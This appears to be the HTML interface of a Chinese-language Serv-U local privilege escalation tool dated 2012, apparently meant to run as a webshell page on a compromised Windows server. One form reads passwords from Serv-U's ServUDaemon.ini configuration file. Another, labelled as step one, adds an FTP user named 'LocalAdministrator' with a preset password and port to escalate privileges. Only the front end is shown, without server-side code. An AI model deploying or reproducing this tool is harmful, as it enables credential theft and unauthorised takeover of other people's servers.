<html>
<head>
<title>Serv-U本地权限提升工具 by cfking@90sec.org</title>
<meta content="text/html; charset=gb2312" http-equiv="Content-Type">
<style type="text/css">body,tr,td{
margin-top:5px;
background-color:#000000;
color:#33FF00;
font-size:12px;
SCROLLBAR-FACE-COLOR:#000000;
scrollbar-arrow-color:#33FF00;
scrollbar-highlight-color:#006300;
scrollbar-3dlight-color:#33FF00;
scrollbar-shadow-color:#33FF00;
}
input,textarea{
border-top-width:1px;
font-weight: bold;
border-left-width: 1px;
font-size:11px;
border-left-color: #33FF00;
background: #000000;
border-bottom-width: 1px;
border-bottom-color: #33FF00;
color: #33FF00;
border-top-color: #33FF00;
font-family: verdana;
border-right-width: 1px;
border-right-color: #33FF00;
}
#s {
background: #006300;
padding-left:5px
}
#d {
background:#dddddd;
}
#d{
background: #003000;
padding-left:5px;
padding-right:5px
}
pre{
font-size: 11px;
font-family: verdana;
color: #33FF00;
}
a{
color:#33FF00;
text-decoration:none;
}
</style>
</head>
<body>

<center>
<form action="" method="post" >
<table width="297" height="53" >
<tr>
<td width="235"><input type="text" name="inipath" value="C:\Program Files\Serv-U\ServUDaemon.ini" size='55'></td>
<td width="46"><input type="submit" name="read" value="读取密码"></td>
</tr>
</table>
</form>
</center>
<form action="?act=add" method="POST">
<center><table width='500' height='163'>
<tr align='center' valign='middle'>
<td colspan='2' id=s><font face=webdings>8</font> <B>第一步：添加FTP用户</b></td></tr>
<tr align='center' valign='middle'><td width='100' id=d>用户名：</td><td width='379' id=d><input name='suser' type='text' id='u' value='LocalAdministrator'></td></tr>
<tr align='center' valign='middle'><td id=d>密 &nbsp;码：</td><td id=d><input name='spass' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr>
<tr align='center' valign='middle'><td id=d>端　口：</td><td id=d><input name='sport' type='text' id='port' value='43958'></td></tr>
<tr align='center' valign='middle'><td id=d>USER&nbsp;&nbsp;：</td><td id=d><input name='user' type='text' id='p' value='admin'></td></tr>
<tr align='center' valign='middle'><td id=d>PASS&nbsp;&nbsp;：</td><td id=d><input name='pass' type='text' id='p' value='admin'></td></tr>
<tr align='center' valign='middle'><td id=d>PORT&nbsp;&nbsp;：</td><td id=d><input name='port' type='text' id='p' value='21'></td></tr>
<tr align='center' valign='middle'><td id=d>路 &nbsp;径：</td><td id=d><input name='dir' type='text' id='p' value='/var/www/html\' size='55'></td></tr>
<tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='adduser'>&nbsp;
<input type='reset' name='Submit2' value='Reset'></td></tr>
</table></center></form>
<div align="center"><strong>Copyright By cfking 2012</strong><br>
Blog:<a href="http://www.luoyes.com" target="_blank">www.luoyes.com</a> Bbs:<a href="http://www.90sec.org" target="_blank">www.90sec.org</a>
</div>
</body>
</html>